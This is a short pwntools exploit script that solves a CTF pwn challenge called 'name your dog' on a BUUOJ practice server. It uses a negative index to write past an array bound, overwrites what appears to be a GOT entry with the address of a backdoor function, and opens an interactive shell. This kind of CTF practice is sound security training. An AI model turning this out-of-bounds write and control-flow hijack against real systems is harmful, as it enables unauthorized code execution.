from pwn import *
context.log_level = 'debug'
binary = './wustctf2020_name_your_dog'

context.binary = binary
r = remote("node4.buuoj.cn", 25704)
# r = process(binary)
# r = gdb.debug(binary,'b *0x08048716')
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')


def name(index,content):
    r.recvuntil(b'Name for which?\n>')
    r.sendline(int2bytes(index))
    r.recvuntil(b'Give your name plz: ')
    r.sendline(content)

backdoor = 0x080485CB
offset = (0x804A028-0x0804A060)//8
name(offset,p32(backdoor))
r.sendline(b'1')


r.interactive()